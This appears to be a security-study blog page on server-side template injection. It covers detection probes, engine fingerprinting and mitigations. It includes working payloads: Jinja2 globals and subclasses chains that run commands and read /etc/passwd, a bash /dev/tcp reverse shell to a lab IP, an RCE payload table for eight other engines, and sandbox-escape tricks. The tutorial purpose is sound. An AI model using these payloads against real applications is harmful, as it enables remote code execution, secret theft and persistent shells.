---
title: Server-Side Template Injection (SSTI)
layout: post
date: 2026-08-23
description: "Server-Side Template Injection (SSTI) occurs when user input is concatenated into a template's source rather than passed to it as data, letting an attacker execute code inside the application's own interpreter."
permalink: /theory/misc/ssti
---

## Server-Side Template Injection (SSTI)

A template engine turns a template, a document with placeholders, into output by evaluating expressions against a context of variables. SSTI occurs when attacker input ends up in the **template source** rather than in the **context**.

That distinction is the vulnerability. Almost every SSTI is a single line of code that got it backwards:

{% raw %}
```python
# Vulnerable: the user's text becomes part of the template
render_template_string(f"<h1>Hello {name}</h1>")

# Safe: the user's text is data the template renders
render_template_string("<h1>Hello {{ name }}</h1>", name=name)
```
{% endraw %}

In the first line, Python's f-string is evaluated *first*. By the time the engine is called, the attacker's text is indistinguishable from the developer's markup. It *is* template source. Autoescaping does not help, because autoescaping protects values in the context, and this value was never in the context.

> SSTI is not "XSS that runs on the server". XSS executes in a victim's browser inside the same-origin sandbox. SSTI executes in the application's own interpreter, with the process's privileges, filesystem access and network position. In most engines it is a direct path to remote code execution, so triage it as RCE until proven otherwise.
{: .prompt-danger }

## Where It Comes From

The pattern is almost always a feature that needs a *dynamic* template rather than a dynamic value:

- **User-customisable greetings, display names, and signatures** rendered into a message body.
- **Email and notification templates** edited through an admin panel.
- **Report / invoice / document builders** where the user supplies the layout.
- **CMS and wiki widgets** that permit "a bit of" template syntax.
- **Error and flash messages** built with string formatting: `render_template_string(f"No such user: {u}")`.
- **Marketing tools and mail-merge features**, which are SSTI by specification and merely need a good sandbox.

The common root cause is a developer reaching for string concatenation (f-strings, `%`, `.format()`, `+`, or `String.format`) to build the template text.

## Detection

### 1. Establish that it renders

Send a payload whose evaluated form differs from its literal form. Arithmetic is ideal because the result is unambiguous:

| Syntax | Engines |
|---|---|
| `{% raw %}{{7*7}}{% endraw %}` | Jinja2, Twig, Nunjucks, Django (no-op), Liquid |
| `${7*7}` | FreeMarker, Thymeleaf, JSP EL, JS template literals |
| `<%= 7*7 %>` | ERB, EJS, ASP.NET |
| `#{7*7}` | Pug, Ruby interpolation |
| `{% raw %}{{7*'7'}}{% endraw %}` | Distinguishes Jinja2 (`7777777`) from Twig (`49`) |

`49` coming back means the input reached an engine. The literal string coming back means it did not.

> Probe reflected input **and** stored input. A field that is echoed straight back may be safe while the same value rendered on a different page (a dashboard, a PDF export, a notification email) hits a vulnerable code path. Casino is a clean example: the same session value was inert on `/dashboard` (passed as a context variable) and gave RCE on `/profile` (concatenated into the template).
{: .prompt-tip }

### 2. Identify the engine

The engine determines the escalation, so fingerprint before weaponising. The fastest method is to submit deliberately invalid syntax, `{% raw %}{{{% endraw %}` or `${` alone, and read the stack trace or error string, which usually names the engine outright (`jinja2.exceptions.TemplateSyntaxError`, `freemarker.core.ParseException`).

Failing that, use behavioural differences: `{% raw %}{{7*'7'}}{% endraw %}` returns `7777777` in Jinja2 (Python string repetition) and `49` in Twig (numeric coercion).

Language is a strong prior. A `Server: Werkzeug` or `gunicorn` header means Python and therefore Jinja2; `X-Powered-By: Express` suggests Nunjucks or EJS; a `JSESSIONID` cookie points at FreeMarker, Velocity or Thymeleaf.

### 3. Map the accessible objects

Before hunting for RCE, dump what the context already exposes. This is often enough on its own:

```
{% raw %}{{ config }}{% endraw %}          Flask: the whole app config, including SECRET_KEY
{% raw %}{{ config.items() }}{% endraw %}  same, forced to render when __repr__ is truncated
{% raw %}{{ self }}{% endraw %}            the template context object
{% raw %}{{ request }}{% endraw %}         request object; .environ often holds env vars
{% raw %}{{ get_flashed_messages }}{% endraw %}  a function object, a route to __globals__
```

A Flask `SECRET_KEY` recovered this way lets you forge session cookies with `flask-unsign`, which is frequently a higher-impact finding than the shell.

## Exploitation: Jinja2 / Python

Jinja2 is the most common target and the escalation is mechanical. Python does not really hide anything: from *any* object you can reach the type hierarchy, and from there the module namespace.

### The globals chain (preferred)

{% raw %}
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
{% endraw %}

Reading it left to right:

- `self` is the template context object.
- `.__init__` is its constructor, a bound function.
- `.__globals__` is the dict of module globals where that function was defined, which contains `__builtins__`.
- `.__builtins__.__import__('os')` imports `os`, bypassing the absence of an `import` statement in template syntax.
- `.popen('id').read()` runs the command and returns stdout as a string for rendering.

Any function object in scope works as the entry point, which matters when `self` is unavailable:

{% raw %}
```
{{ get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ url_for.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```
{% endraw %}

`lipsum` and `cycler` are Jinja2 globals available in every template, so they survive contexts where Flask helpers are not registered.

### The subclasses chain (fallback)

When `__globals__` is filtered, walk the type hierarchy to find a class that already imports something useful:

{% raw %}
```
{{ ''.__class__.__mro__[1].__subclasses__() }}
```
{% endraw %}

That returns a long list; find the index of `subprocess.Popen` or `os._wrap_close`, then call it. The index is **not stable** across Python versions, so locate it dynamically rather than copying an index from a blog post:

{% raw %}
```
{% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if c.__name__ == 'Popen' %}{{ c(['id'], stdout=-1).communicate()[0] }}{% endif %}{% endfor %}
```
{% endraw %}

### Reading files without a shell

Useful when `os` is blocked but the object model is not:

{% raw %}
```
{{ self.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}
```
{% endraw %}

### Getting a reverse shell

{% raw %}
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.14.2/9001 0>&1" &').read() }}
```
{% endraw %}

The trailing `&` is important. `popen().read()` blocks until the command exits, so a foreground shell hangs the HTTP request until the server times out and kills it. Backgrounding lets the response return while the shell persists.

`popen()` also returns **stdout only**. Append `2>&1` when a command appears to produce no output.

## Exploitation: Other Engines

| Engine | Language | RCE payload |
|---|---|---|
| **Twig** | PHP | `{% raw %}{{['id']|filter('system')}}{% endraw %}` or `{% raw %}{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}{% endraw %}` |
| **Smarty** | PHP | `{% raw %}{php}echo shell_exec('id');{/php}{% endraw %}` or `{% raw %}{system('id')}{% endraw %}` |
| **FreeMarker** | Java | `${"freemarker.template.utility.Execute"?new()("id")}` |
| **Velocity** | Java | `#set($e="e")$e.getClass().forName("java.lang.Runtime").getRuntime().exec("id")` |
| **Thymeleaf** | Java | `${T(java.lang.Runtime).getRuntime().exec('id')}` |
| **Nunjucks** | Node | `{% raw %}{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}{% endraw %}` |
| **EJS** | Node | `<%= process.mainModule.require('child_process').execSync('id') %>` |
| **ERB** | Ruby | ``<%= `id` %>`` or `<%= system("id") %>` |
| **Handlebars** | Node | Requires prototype-chain abuse; not RCE by default |

Django templates are the notable exception: the language is deliberately not Turing-complete, method calls take no arguments, and there is no route to arbitrary code. SSTI there is limited to disclosure, such as `{% raw %}{{ settings.SECRET_KEY }}{% endraw %}` if `settings` is in scope, which is still worth reporting.

## Sandbox Escapes

Some applications intentionally expose template syntax (mail merge, report builders) and rely on the engine's sandbox. Sandboxes fail in predictable ways:

- **Jinja2's `SandboxedEnvironment`** blocks attributes starting with `_`. Bypass with `|attr()` and string building: `{% raw %}{{ ''|attr('__cl'+'ass__') }}{% endraw %}`, or via `request.__class__` when `request` is exposed.
- **Attribute denylists** are bypassed by `getattr`-equivalents, subscript syntax (`x['__class__']` vs `x.__class__`), and concatenated strings.
- **Twig's sandbox** is bypassed via `_self`, which references the template object and reaches the environment.
- **Filters that call arbitrary functions**, such as `|map()`, `|filter()` and `|sort()` with a callback, are the usual hole, because they take a *function name* as a string.

## Mitigation

- **Never build template source from user input.** Pass user data through the context: `render_template(tpl, name=name)`. This single rule prevents the entire class.
- **Use static template files** loaded from disk. If templates must be dynamic, they must come from a trusted store, not from a request.
- **If users must supply templates**, use a logic-less engine by design (Mustache, or Django templates) rather than sandboxing a powerful one. Sandboxes are a denylist around a Turing-complete language, and they are broken repeatedly.
- **Run the renderer out-of-process** with a hard timeout, dropped privileges and no network, so a bypass yields a useless shell rather than the app's identity.
- **Do not expose `config`, `settings`, `request` or `os`** in the template context. Pass the specific values a template needs.
- **Disable debug mode in production.** Flask's `DEBUG=True` alone exposes the Werkzeug console at `/console`, which is RCE without any template work.

## Related Boxes

- [Casino](/posts/hacksmarter-casino/): f-string into `render_template_string`, with the same value proven safe on the adjacent route.
- [Odyssey](/posts/hacksmarter-odyssey/): the globals chain against a Flask "template preview" feature.

## References

- [PortSwigger: Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)
- [PayloadsAllTheThings: SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [James Kettle: Server-Side Template Injection: RCE for the modern webapp](https://portswigger.net/research/server-side-template-injection)
- [Jinja2: Sandbox documentation](https://jinja.palletsprojects.com/en/stable/sandbox/)
- [HackTricks: SSTI](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)
